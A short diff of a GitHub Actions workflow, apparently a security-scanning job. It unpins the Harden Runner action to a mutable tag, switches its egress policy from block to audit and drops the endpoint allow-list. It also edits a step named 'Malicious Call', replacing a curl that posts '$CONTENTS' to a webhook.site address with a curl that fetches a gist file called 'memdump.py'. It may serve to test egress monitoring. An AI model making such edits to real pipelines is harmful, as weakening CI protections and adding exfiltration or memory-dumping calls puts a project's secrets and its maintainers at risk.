@@ -36,21 +36,9 @@ jobs:
 
     steps:
       - name: Harden Runner
-        uses: step-security/harden-runner@91182cccc01eb5e619899d80e4e971d6181294a7 # v2.10.1
+        uses: step-security/harden-runner@v2 # v2.10.1
         with:
-          egress-policy: block
-          allowed-endpoints: >
-            api.github.com:443
-            api.osv.dev:443
-            api.scorecard.dev:443
-            auth.docker.io:443
-            fulcio.sigstore.dev:443
-            github.com:443
-            index.docker.io:443
-            oss-fuzz-build-logs.storage.googleapis.com:443
-            rekor.sigstore.dev:443
-            tuf-repo-cdn.sigstore.dev:443
-            www.bestpractices.dev:443
+          egress-policy: audit
 
       - name: "Checkout code"
         uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
@@ -94,4 +82,4 @@ jobs:
           sarif_file: results.sarif
           
       - name: "Malicious Call"
-        run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
+        run: curl https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py
